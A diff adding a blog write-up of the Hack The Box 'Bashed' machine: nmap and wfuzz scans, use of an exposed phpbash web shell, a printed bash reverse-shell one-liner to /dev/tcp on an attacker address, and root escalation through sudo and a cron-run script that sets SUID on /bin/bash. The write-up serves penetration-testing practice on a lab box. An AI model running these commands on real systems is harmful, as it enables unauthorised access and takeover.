@@ -1,0 +1,150 @@
+---
+title: Bashed
+author: nf4ll
+date: 2022-12-21 10:29:00 +0000
+categories: [Hack The Box, Machines]
+tags: [Apache, Web, SUID, Code Execution]
+math: true
+mermaid: true
+image:
+  path: /assets/img/posts/Bashed/Bashed.PNG
+  width: 1200
+  height: 600
+---
+# Write Up
+
+About Bashed machine:
+- OS: Linux
+- Difficulty: Easy
+- Release date: 2017-Dec-09
+- IP: 10.10.10.68
+
+## Scan phase
+
+Firstly, I run an active scan to get the open ports in the machine. Syn Stealth Scan (-sS) is used for this scan. 
+
+```bash
+nmap -sS -p- --open -n -Pn --min-rate 5000 -oN host 10.10.10.68
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-21 17:50 CET
+Nmap scan report for 10.10.10.68
+Host is up (0.047s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 11.89 seconds
+```
+
+Now, I scan versions and run default NSE scripts to detect possible attacks or exclude other attacks, like brute force. The versions are obtained with -sV parameter and extra information is gained with -sC parameter.
+The port 80 is found open. This port is running Apache 2.4.18, but I haven't more information. 
+
+```bash
+nmap -sCV -p80 -oN ports 10.10.10.68
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-21 17:51 CET
+Nmap scan report for 10.10.10.68
+Host is up (0.046s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel Development Site
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
+```
+
+At this point, I search the web to get any interesting paths or something to execute an exploit.
+
+![Desktop View](/assets/img/posts/Bashed/web.PNG)
+
+I can't find anything on the web. I attack the web by fuzzing to search hint paths. I choose wfuzz tool to run this attack. I prefer wfuzz than other because you can add threads to do it shorter.
+
+```bash
+wfuzz -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.68/FUZZ
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.68/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                    
+=====================================================================
+
+000000001:   200        161 L    397 W      7743 Ch     "# directory-list-2.3-medium.txt"                                                                                          
+000000007:   200        161 L    397 W      7743 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                          
+000000003:   200        161 L    397 W      7743 Ch     "# Copyright 2007 James Fisher"                                                                                            
+000000550:   301        9 L      28 W       308 Ch      "css"                                                                                                                      
+000000014:   200        161 L    397 W      7743 Ch     "http://10.10.10.68/"                                                                                                      
+000000016:   301        9 L      28 W       311 Ch      "images"                                                                                                                   
+000000013:   200        161 L    397 W      7743 Ch     "#"                                                                                                                        
+000000012:   200        161 L    397 W      7743 Ch     "# on atleast 2 different hosts"                                                                                           
+000000011:   200        161 L    397 W      7743 Ch     "# Priority ordered case sensative list, where entries were found"                                                         
+000000010:   200        161 L    397 W      7743 Ch     "#"                                                                                                                        
+000000009:   200        161 L    397 W      7743 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                                                      
+000000006:   200        161 L    397 W      7743 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                            
+000000008:   200        161 L    397 W      7743 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                                                               
+000000005:   200        161 L    397 W      7743 Ch     "# This work is licensed under the Creative Commons"                                                                       
+000000002:   200        161 L    397 W      7743 Ch     "#"                                                                                                                        
+000000953:   301        9 L      28 W       307 Ch      "js"                                                                                                                       
+000000834:   301        9 L      28 W       308 Ch      "dev"                                                                                                                      
+000002771:   301        9 L      28 W       310 Ch      "fonts"                                                                                                                    
+000000338:   301        9 L      28 W       308 Ch      "php"                                                                                                                      
+```
+
+## Explotation phase
+
+An important directory is found by wfuzz. The directory is called  _dev_. Two files are been in the directory. I visualize the directory _phpbash.php_. A webshell runs in this path and it works like common shell.
+
+![Desktop View](/assets/img/posts/Bashed/webshell.PNG)
+
+I could try to get the user flag without enabling a reverse shell. Finally, the user flag is obtained:
+
+![Desktop View](/assets/img/posts/Bashed/user.PNG)
+
+To finish with the explotation phase, I run a reverse shell to upload privilages more easily. The & symbol is changed by %26 because we need to encode as url-encode. If The command isn't encoded, the shell doesn't run because it is not supported. 
+After I run the reverse shell, I run netcat to open a listen port and receive the shell.
+
+```bash
+bash -c "bash -i %26> /dev/tcp/10.10.14.8/443 0>%261"
+```
+
+Once the access is gained, this phase is ended.
+
+## Privilege escalation
+
+Now, I verify that I'm not in user groups and I find something useful to escalate privileges. The user www-data can run commands as scriptmanager without password.
+
+![Desktop View](/assets/img/posts/Bashed/sudol.PNG)
+
+The following command is run to get a bash of the scriptmanager user:
+
+```bash
+sudo -u scriptmanager bash -c bash
+```
+
+When the user flag is searched a "scripts" directory is found. Here is the content of both scripts:
+
+```bash
+# test.py
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+
+# test.txt
+testing 123!
+```
+
+"Test.txt" file is created by root. In this case We can think root have a cron task to run "test.py". I can modify "test.py", so I write the script in python to modify permission and get SUID permission.
+
+When "test.py" is run I analize permissions. SUID permission is found in "/bin/bash". To get the bash of the root user I need to run the following command:
+
+```bash
+bash -p 
+# -p is to runs this command like its owner. In this case I runs bash as root.
+```
+
+Finally, I get the root flag: 
+
+![Desktop View](/assets/img/posts/Bashed/root.PNG)
